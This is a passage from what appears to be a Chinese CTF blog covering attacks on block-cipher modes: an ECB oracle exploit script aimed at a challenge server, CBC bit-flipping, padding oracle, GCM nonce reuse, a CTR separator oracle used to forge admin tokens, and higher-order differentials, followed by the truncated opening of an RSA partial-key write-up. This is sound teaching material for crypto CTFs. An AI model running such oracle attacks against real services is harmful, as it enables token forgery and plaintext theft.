inline">\(E_{k}(plainText+System.currentTimeMillis()+flag)\)</span></p><p>currentTimeMillis返回长度固定（除非运气极差碰上最高位进位...想peach）</p><p>且有<code>private static String TRIPLE_DES_TRANSFORMATION = "DESede/ECB/PKCS5Padding"</code>，因此有如下攻击方法：</p><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/Snipaste_2020-08-12_16-28-03.png"></p><p>prefix填充<code>padding_length*'a'</code>后，恰好能使PKCS5后最后为<code>8*'\x00'</code></p><p>基于<span class="math inline">\(8\mid(len(E_{k}(&#39;&#39;+currentTimeMillis+flag))+padding\_length)\)</span></p><p>得到crack_area分组对应密文后，由于crack_area明文段后7bits均已知，因此send data为爆破位+7已知bits，当返回的ct[:8]与前者吻合时，爆破当前比特位成功</p><p>后续比特位均类似，prefix++得到新的crack_area内容，进而逐位爆破即可</p><h4 id="exp-3">exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url1 = <span class="string">"http://dcf1d021-491b-4279-ae42-d56a10fc3334.node3.buuoj.cn/api//comment/news/28"</span></span><br><span class="line">url2 = <span class="string">"http://dcf1d021-491b-4279-ae42-d56a10fc3334.node3.buuoj.cn/api//comment/news/28?size=10&amp;page=0&amp;sort=commentId%2Cdesc"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">web_encrypt</span><span class="params">(payload)</span>:</span></span><br><span class="line">    r = requests.post(url1, json=&#123;<span class="string">"commentEmail"</span>: <span class="string">"1@qq.com"</span>,</span><br><span class="line">                                  <span class="string">"commentContent"</span>: payload, <span class="string">"commentNickname"</span>: <span class="string">"0xDktb"</span>&#125;)</span><br><span class="line">    commentId = r.json()[<span class="string">'commentId'</span>]</span><br><span class="line">    r = requests.get(url2)</span><br><span class="line">    content = r.json()[<span class="string">'content'</span>]</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> content:</span><br><span class="line">        <span class="keyword">if</span> _[<span class="string">'commentId'</span>] == commentId:</span><br><span class="line">            <span class="keyword">return</span> b64decode(_[<span class="string">'commentContent'</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_padding_length</span><span class="params">()</span>:</span></span><br><span class="line">    origin_length = len(web_encrypt(<span class="string">''</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">9</span>):</span><br><span class="line">        cur_length = len(web_encrypt(<span class="string">'a'</span> * i))</span><br><span class="line">        <span class="keyword">if</span> cur_length != origin_length:</span><br><span class="line">            <span class="keyword">return</span> (i, cur_length)  <span class="comment"># 8 | (len(enc(salt)) + i)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_salt</span><span class="params">(padding_length, crack_pos)</span>:</span></span><br><span class="line">    salt = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">42</span>):</span><br><span class="line">        crack_area = web_encrypt(</span><br><span class="line">            <span class="string">'a'</span> * (len(salt) + padding_length + <span class="number">1</span>))[crack_pos<span class="number">-8</span>:crack_pos]</span><br><span class="line">        <span class="keyword">if</span> len(salt) &gt;= <span class="number">7</span>:</span><br><span class="line">            payload = salt[:<span class="number">7</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload = salt + (<span class="number">7</span> - len(salt)) * chr(<span class="number">7</span> - len(salt))</span><br><span class="line">        isFound = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</span><br><span class="line">            guess = web_encrypt(c + payload)[:<span class="number">8</span>]</span><br><span class="line">            <span class="keyword">if</span> guess == crack_area:</span><br><span class="line">                isFound = <span class="literal">True</span></span><br><span class="line">                salt = c + salt</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">assert</span>(isFound == <span class="literal">True</span>)</span><br><span class="line">        print(salt)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    padding_length, crack_pos = crack_padding_length()</span><br><span class="line">    crack_salt(padding_length, crack_pos)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="group-modecbc">Group Mode(CBC)</h3><h4 id="theorem-6">Theorem</h4><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/cbc_encryption.png"></p><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/cbc_decryption.png"></p><h5 id="cbc---flipped-ciphertext-bits">CBC - Flipped Ciphertext Bits</h5><p>可以看到CBC模式下，任一分组<span class="math inline">\(C_{i}\)</span>的解密结果，均只与<span class="math inline">\(C_{i}\)</span>和<span class="math inline">\(C_{i-1}\)</span>有关（<span class="math inline">\(C_{1}\)</span>只和<span class="math inline">\(IV,C_{1}\)</span>有关）</p><p>因此只需令<span class="math inline">\(C_{i-1}=C_{i-1}\oplus P_{i}\oplus (you\ want)\)</span>即可（从最后一块向前翻转）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="keyword">import</span> os</span><br><span class="line">   ...: <span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">   ...: key, iv = os.urandom(<span class="number">16</span>), os.urandom(<span class="number">16</span>)</span><br><span class="line">   ...: aes1 = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">   ...: aes2 = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: pt = <span class="string">b"0xDktb_wants_a_girlfriend_orzzzzzzzzzzzzzzzzzzzzzzzzzzzz"</span></span><br><span class="line">   ...: pad = <span class="keyword">lambda</span> x : (x + (<span class="number">16</span> - len(x) % <span class="number">16</span>) * bytes([<span class="number">16</span> - len(x) % <span class="number">16</span>]))</span><br><span class="line">   ...: pt = pad(pt)</span><br><span class="line">   ...: len(pt)</span><br><span class="line">Out[<span class="number">2</span>]: <span class="number">64</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: <span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">   ...:     <span class="keyword">return</span> bytes(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(a, b))</span><br><span class="line">   ...: ct = aes1.encrypt(pt)</span><br><span class="line">   ...: payload = <span class="string">b"pt_1st_1s_H3r3!!pt_2nd_1s_H3r3!!pt_3rd_1s_H3r3!!pt_4th_1s_H3r3!!"</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">   ...:     ct_block = xor(xor(pt[<span class="number">16</span>*(<span class="number">3</span>-i):<span class="number">16</span>*(<span class="number">4</span>-i)], ct[<span class="number">16</span>*(<span class="number">2</span>-i):<span class="number">16</span>*(<span class="number">3</span>-i)]), payload[<span class="number">16</span>*(<span class="number">3</span>-i):<span class="number">16</span>*(<span class="number">4</span>-i)])</span><br><span class="line">   ...:     ct = ct[:<span class="number">16</span>*(<span class="number">2</span>-i)] + ct_block + ct[<span class="number">16</span>*(<span class="number">3</span>-i):]</span><br><span class="line">   ...:     dec_iv = ct[<span class="number">-16</span>:]</span><br><span class="line">   ...:     pt = aes2.decrypt(ct)</span><br><span class="line">   ...: dec_iv = xor(xor(pt[:<span class="number">16</span>], dec_iv), payload[:<span class="number">16</span>])</span><br><span class="line">   ...: aes3 = AES.new(key, AES.MODE_CBC, dec_iv)</span><br><span class="line">   ...: pt = aes3.decrypt(ct)</span><br><span class="line">   ...: print(pt)</span><br><span class="line"><span class="string">b'pt_1st_1s_H3r3!!pt_2nd_1s_H3r3!!pt_3rd_1s_H3r3!!pt_4th_1s_H3r3!!'</span></span><br></pre></td></tr></table></figure><h5 id="cbc---chosen-plaintext-attack">CBC - Chosen Plaintext Attack</h5><p><a href="https://0xdktb.top/2020/08/02/WriteUp-WMCTF2020-Crypto/#Game">https://0xdktb.top/2020/08/02/WriteUp-WMCTF2020-Crypto/#Game</a></p><h5 id="cbc---padding-oracle-attack">CBC - Padding Oracle Attack</h5><p>在服务器检查解密合法性，为检查PKCS5-padding的suffix部分，且合法与非法返回不同状态时（不返回明文内容），可以采用Padding Oracle Attack</p><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/Snipaste_2020-08-13_10-14-57.png"></p><h3 id="group-modegcm">Group Mode(GCM)</h3><h4 id="theorem0">Theorem0</h4><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/Snipaste_2020-08-13_16-26-27.png"></p><p>对AES-GCM，有以下<strong>符号定义</strong>：</p><p><span class="math inline">\(a|b\)</span>: a, b位串的连接；</p><p><span class="math inline">\(0^{s}\)</span>: 长度为s的0串</p><p><span class="math inline">\(A_{i}\)</span>: 第i块的auth-data</p><p><span class="math inline">\(IV\)</span>: 96bits(12bytes)初始向量</p><p><span class="math inline">\(cnt\)</span>: 4bytes计数器counter值，<span class="math inline">\(cnt=(i+1)\%2^{32}\)</span></p><p><span class="math inline">\(J_{i}\)</span>: 第i块的Enc input，<span class="math inline">\(J_{0}=IV||0^{31}||1\)</span></p><p><span class="math inline">\(Gmul_{H}(X)\)</span>: <span class="math inline">\(GF(2^{128})\)</span>上的<span class="math inline">\(H\cdot X\)</span>，素多项式<span class="math inline">\(f=1+\alpha+\alpha^{2}+\alpha^{7}+\alpha^{128}\)</span></p><p>对生成auth-tag的过程有：</p><ul><li><span class="math inline">\(H=Enc_{k}(0^{128})\)</span></li><li><span class="math inline">\(X_{0}=0\)</span>，假设Auth-data占了m个block长度，<span class="math inline">\(X_{i}=Gmul_{H}(X_{i-1}\oplus A_{i})\)</span>,for <span class="math inline">\(i\in\{1,..,m\}\)</span></li><li><span class="math inline">\(X_{i+m}=Gmul_{H}(X_{i+m-1}\oplus C_{i})\)</span>,for <span class="math inline">\(i\in\{1,...,n\}\)</span></li><li><span class="math inline">\(S=Gmul_{H}(X_{m+n}\oplus(len(A)||len(C)))\)</span>，len(A)和len(C)均为长度64的位串（BLOCK_SIZE/2)</li><li><span class="math inline">\(T=S\oplus Enc_{k}(J_{0})\)</span>，即为auth-tag</li></ul><p>GCM最后返回的消息为<span class="math inline">\(C||T\)</span>.</p><h4 id="theorem1---the-forbidden-attack">Theorem1 - The Forbidden Attack</h4><h5 id="overview">Overview</h5><p>TLS下的AES-GCM生成的12bytes IV由以下部分组成：</p><ul><li>Salt(4 bytes)：由TLS handshake，值等于server_write_IV / client_write_IV，属于IV的implicit part</li><li>Nonce(8 bytes)：服务器随机生成，属于IV的explicit part</li></ul><p><span class="math inline">\(g(X)=A_{1}X^{m+n+1}+...+A_{m}X^{n+2}+C_{1}X^{n+1}+...+C_{n}X^{2}+LX+Enc_{k}(J_{0})\)</span></p><p>(其中<span class="math inline">\(L=(len(A)||len(C))\)</span>)</p><p><span class="math inline">\(g(H)=T\)</span></p><p>我们的攻击主要基于已找到Nonce相同的一对collision（同一会话下Salt不变），则有</p><p>假设<span class="math inline">\(m=0,n=1\)</span>，</p><p><span class="math inline">\(g_{1}(X)=C_{1,1}X^{2}+L_{1}X+Enc_{k}(J_{0})\)</span></p><p><span class="math inline">\(g_{2}(X)=C_{2,1}X^{2}+L_{2}X+Enc_{k}(J_{0})\)</span></p><p>且<span class="math inline">\(g_{1}(H)=T_{1},g_{2}(H)=T_{2}\)</span></p><p><span class="math inline">\(\therefore(C_{1,1}+C_{2,1})H^{2}+(L_{1}+L_{2})H+T_{1}+T_{2}=0\)</span>. (系数均已知)</p><p>故candidate H在上述方程的roots中，而roots总数一般与方程degree相同，且现实中degree并不会过大（消息极长除外），因此在发生nonce collision时，H的值就能被攻击</p><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/Snipaste_2020-08-16_23-39-32.png"></p><p>有了H就意味着我们能自生成合法auth-tag</p><p>攻击场景实例：</p><blockquote><p>服务器与客户端间以AES/GCM进行通信，<strong>AES密钥及4bytes的Salt</strong>双方在通过密钥协商协议后各自保存在本地（第三方无法获取）</p><p>在正常通信时，传输的为<strong>cipher &amp; auth-tag T &amp; Nonce(8 bytes)</strong>，可被第三方截取</p><p>则若我们通过上述方法攻破H，又有<strong>已知明文攻击的Oracle</strong>，即可通过已知明文的一组数据进行密文篡改并自生成合法auth-tag，实现对服务器的欺骗</p></blockquote><h3 id="group-modectr">Group Mode(CTR)</h3><h4 id="theorem0-1">Theorem0</h4><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/1920px-CTR_encryption_2.svg.png"></p><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/1920px-CTR_decryption_2.svg.png"></p><p><span class="math inline">\(C_j=E_k(nonce_j)\oplus P_j\)</span></p><p><span class="math inline">\(P_j=E_k(nonce_j)\oplus C_{j}\)</span></p><h4 id="theorem1---separator-oracle">Theorem1 - Separator Oracle</h4><p>假设明文格式为<span class="math inline">\(username||timestamp||userlevel\)</span></p><p>Separator Oracle能应用的场景大致为：</p><p>普通用户注册后，服务器给出其<span class="math inline">\(username||timestamp||userlevel\)</span>通过CTR加密生成的token，保持作sessionid</p><p>在发起登陆请求时，服务端解密sessionid后若不成功会根据具体情况返回不用Exception</p><p>我们主要利用的为separate错误引起的Error抛出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">separator = <span class="string">'|'</span></span><br><span class="line">ct = get_cookie(<span class="string">'sessionid'</span>)</span><br><span class="line">pt = decrypt(ct)</span><br><span class="line">pt = pt.split(separator)</span><br><span class="line"><span class="keyword">if</span> len(pt) != <span class="number">3</span>:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">"Separate failed."</span>)</span><br></pre></td></tr></table></figure><p>攻击思路如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pt = [<span class="number">0</span>] * len(ct)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(ct)):</span><br><span class="line">    new_ct1 = ct[:i] + bytes([ct[i] ^ <span class="number">1</span>]) + ct[i+<span class="number">1</span>:]</span><br><span class="line">    new_ct2 = ct[:i] + bytes([ct[i] ^ <span class="number">2</span>]) + ct[i+<span class="number">1</span>:]</span><br><span class="line">    resp1, resp2 = oracle(new_ct1), oracle(new_ct2)</span><br><span class="line">    <span class="keyword">if</span> resp1 == SeparatorException <span class="keyword">and</span> resp2 == SeparatorException:</span><br><span class="line">        pt[i] = ord(<span class="string">'|'</span>) <span class="comment"># i is a separator's index</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">0x100</span>):</span><br><span class="line">            new_ct = ct[:i] + bytes([ct[i] ^ j]) + ct[i+<span class="number">1</span>:]</span><br><span class="line">            resp = oracle(new_ct)</span><br><span class="line">            <span class="keyword">if</span> resp == SeparatorException: <span class="comment"># add a separator(too much)</span></span><br><span class="line">                pt[i] = j ^ ord(<span class="string">'|'</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">pt = bytes(pt)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> bytes(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(a, b))</span><br><span class="line"></span><br><span class="line">key = xor(pt, ct)</span><br></pre></td></tr></table></figure><p>原理很简单，CTR实质上可视作流密码（因为在需要加解密时，其分组密码部分得到的key是固定的）</p><p>对于ct的任一byte，若其对应pt的byte为一separator，则在异或上任一非零值送去解密时，oracle均会返回SeparatorException（occurred by removing a separator）</p><p>而若对应的非separator，则只需爆破异或的值，当返回SeparatorException时，即可知<span class="math inline">\(new\_ct\oplus j=ct\oplus ord(&#39;|&#39;)\)</span></p><p>通过这种攻击方式，我们能还原出分组加密部分的Key，且由于CTR mode是没有鉴别码机制的</p><p>因此我们能得到任意P'对应的密文<span class="math inline">\(C&#39;=C\oplus P\oplus P&#39;\)</span>，即合法token，进行admin伪造（若中间为时间戳的话需篡改为满足token现仍有效期内的值）</p><h3 id="高阶差分分析">高阶差分分析</h3><h4 id="theorem0---离散高阶函数与高阶差分">Theorem0 - 离散高阶函数与高阶差分</h4><p><strong>定义1.</strong> 设<span class="math inline">\((S,+)\)</span>和<span class="math inline">\((T,+)\)</span>是两个Abel群，<span class="math inline">\(f:S\rightarrow T\)</span>，则f在S中a点处的导数定义为 <span class="math display">\[\Delta_{a}f(x)=f(x+a)-f(x)\]</span> 在点<span class="math inline">\(\{a_1,a_2,...,a_i\}\)</span>处的i阶导数定义为 <span class="math display">\[\Delta_{a_1,a_2,...,a_i}^{(i)}f(x)=\Delta_{a_i}(\Delta_{a_1,a_2,...,a_i}^{(i-1)}f(x))\]</span> <strong>命题1.</strong> 设f是一个n变元的布尔函数，函数的代数次数为deg(f)，则 <span class="math display">\[deg(\Delta_af(x))\leq deg(f(x))-1\]</span> (布尔函数f是从<span class="math inline">\(F_2^n\)</span>到<span class="math inline">\(F_2\)</span>的映射)</p><p><strong>命题2.</strong> 设f是一个n变元的布尔函数，则函数的n阶导数为常数(constant)，进一步，若f可逆，则其n-1阶导数为常数</p><p><strong>命题3.</strong> 设f是一个n变元的布尔函数，<span class="math inline">\(L[a_1,...,a_i]\)</span>是<span class="math inline">\(a_1,...,a_i\)</span>的所有可能的线性组合，则 <span class="math display">\[\Delta_{a_1,...,a_i}^{(i)}f(x)=\sum_{c\in L[a_1,...,a_i]}f(x\oplus c)\]</span> <strong>命题4.</strong> 布尔函数的高阶导数只依赖于其阶的大小，即 <span class="math display">\[\Delta_{a_1,...,a_i}^{(i)}f(x)=\Delta_{a_{\pi(1)},...,a_{\pi(i)}}^{(i)}f(x)\]</span> <strong>命题5.</strong> 设<span class="math inline">\(f:F_2^n\rightarrow F_2^n\)</span>，<span class="math inline">\(a_1,a_2,...,a_i\)</span>是<span class="math inline">\(F_2^n\)</span>上i个线性无关的向量，若x在<span class="math inline">\(F_2^n\)</span>上分布均匀，则对任意<span class="math inline">\(b\in F_2^n\)</span>，等式<span class="math inline">\(\Delta_{a_1,...,a_i}^{(i)}f(x)=b\)</span>成立的概率要么为0，要么至少为<span class="math inline">\(2^{i-n}\)</span></p><p>Proof: 假设有<span class="math inline">\(\Delta_{a_1,...,a_i}^{(i)}f(x_0)=b\)</span>，则<span class="math inline">\(\sum_{c\in L[a_1,...,a_i]}f(x\oplus c)=b\)</span>，进而</p><p><span class="math inline">\(\forall c\in L[a_1,...,a_i],\Delta_{a_1,...,a_i}^{(i)}f(x_0\oplus c)=b\)</span>，<span class="math inline">\(Pro(\Delta_{a_1,...,a_i}^{(i)}f(x)=b)\geq2^{i}/2^{n}=2^{i-n}\)</span></p><p>Q.E.D.</p><p><strong>命题6.</strong> 当输入x均匀时，则差分对(a, b)出现的概率为f(x)在点a处的一阶导数取值b的概率</p><p><span class="math inline">\(P(\Delta_y=b|\Delta_x=a)=P(f(x+a)-f(x)=b)=P(\Delta_af(x)=b)\)</span></p><p>进而推广至高阶差分，函数的一条i阶差分，即找到一i+1元数组<span class="math inline">\((a_1,...,a_i,b)\)</span>，使得<span class="math inline">\(\Delta_{a_1,...,a_i}^{(i)}f(x)=b\)</span></p><p><strong>离散高阶函数与高阶差分的联系为：</strong> f(x)有一条i阶差分<span class="math inline">\((a_1,...,a_i,b)\)</span>当且仅当f(x)在<span class="math inline">\((a_1,...,a_i)\)</span>处导数为b</p><h4 id="theorem1---高阶差分攻击">Theorem1 - 高阶差分攻击</h4><p>以下为对一般分组密码的高阶差分攻击的框架：</p><p>设E是一个r rounds的分组密码算法，可写作<span class="math inline">\(Y=E(X,K)\)</span>，假设</p><p>r-1 rounds的加密算法<span class="math inline">\(E_{r-1}(X,K_{1},...,K_{r-1})\)</span>的deg为d，则 <span class="math display">\[\Delta_{a_1,...,a_d}^{(d)}E_{r-1}(X,K_{1},...,K_{r-1})=0\]</span> (由于<span class="math inline">\(E_{r-1}\)</span>可逆)，且有 <span class="math display">\[E_{r}^{-1}(Y,K_{r})=E_{r-1}(X,K_{1},...,K_{r-1})\\\Delta_{a_1,...,a_d}^{(d)}E_{r}^{-1}(Y,K_{r})=0\\\therefore\sum_{c\in L(...)}E_{r}^{-1}(Y\oplus c,K_{r})=0\]</span> 则当d-1足够小时，攻击者就可以通过下述攻击流程获得最后一轮的轮密钥<span class="math inline">\(K_{r}\)</span>：</p><ol type="1"><li>寻找一个r-1 rounds的高阶差分区分器；</li><li>根据<strong>差分区分器</strong>的输出特征，确定要恢复的最后一轮轮密钥长度（一般不直接一次性恢复完整长度的轮密钥），不妨设所要恢复的部分轮密钥长度为s，则设置<span class="math inline">\(2^{s}\)</span>个密钥计数器，初始化均为0；</li><li>随机选取一个d维子空间L（要求E可逆），则对所有<span class="math inline">\(X\in L\)</span>，利用同一未知的密钥对其进行加密，获得对应的密文Y（Chosen Plain Attack，Oracle）；</li><li>利用所有最后一轮的候选密钥对Y进行解密并<strong>求和</strong>，若该值为0，则对应counter++；</li><li>选取counter max对应的作为正确<span class="math inline">\(K_{r}\)</span>；</li></ol>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Block </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp(Aurora) - Mission Impossible</title>
      <link href="/2020/04/05/WriteUp-Aurora-Mission-Impossible/"/>
      <url>/2020/04/05/WriteUp-Aurora-Mission-Impossible/</url>
      
        <content type="html"><![CDATA[<h4 id="题目考点">[题目考点]</h4><ul><li>DH-MIMT</li><li>RSA私钥低位泄露引起的CopperSmith攻击 (预期解是解同余方程)</li></ul><h4 id="题目文件">[题目文件]</h4><p><a href="Impossible%20Mission.zip">Click Here to Download</a></p><h4 id="题解分析">[题解分析]</h4><p><strong>Encryption</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Step 1</span></span><br><span class="line">aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">flag = adaptmessage(flag) <span class="comment"># right padding with b'\x00'</span></span><br><span class="line">encrypted_flag = b64encode(aes.encrypt(flag))</span><br><span class="line"><span class="comment"># Step 2</span></span><br><span class="line">p = getPrime(<span class="number">700</span>)</span><br><span class="line">q = getPrime(<span class="number">1400</span>)</span><br><span class="line">e = getPrime(<span class="number">10</span>)</span><br><span class="line"><span class="keyword">assert</span>(GCD(e, phi) == <span class="number">1</span>)</span><br><span class="line">enc = pow(bytes_to_long(key), e, n)</span><br><span class="line">print(<span class="string">"Brooke's partial d: "</span> + str(d % (<span class="number">2</span>**<span class="number">1050</span>))) <span class="comment"># leak d's low 1050bits</span></span><br><span class="line"><span class="comment"># Step 3</span></span><br><span class="line"><span class="comment"># DH-MIMT challenging(5 round's success required)</span></span><br><span class="line"><span class="comment"># Finally given message including enc in Step2</span></span><br></pre></td></tr></table></figure><p><strong>Decryption</strong></p><p>DH-MIMT后，获得AES密钥的对应RSA密文.</p><ul><li>Crack p (700 bits)</li></ul><p><span class="math inline">\(\because ed_{0}p\equiv p+kpn-kp^{2}-kn+kp(mod\ 2^{size(d_{0})}),k\in [1,e]\)</span></p><p><span class="math inline">\(\because size(p)&lt;size(d_{0})\)</span></p><p><span class="math inline">\(\therefore\)</span> 求解p的一元模等式即可（至多e次）</p><ul><li>Crack q (1400 bits)</li></ul><p><span class="math inline">\(\because size(n)=2100,size(d0)=1050&gt;\frac{size(n)}{4}\)</span></p><p>由Crack p里提到的模等式可求解出q的低1050 bits，因此问题转化为partial_p</p><p><span class="math inline">\(\beta\)</span>取0.65略小于<span class="math inline">\(\frac{size(q)}{size(n)}\)</span>，根上界取<span class="math inline">\(2^{1400-size(q_{0})}\)</span>.</p><ul><li>在Crack p时每一轮start一个守护线程，来进行Crack q</li></ul><h4 id="exp">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span 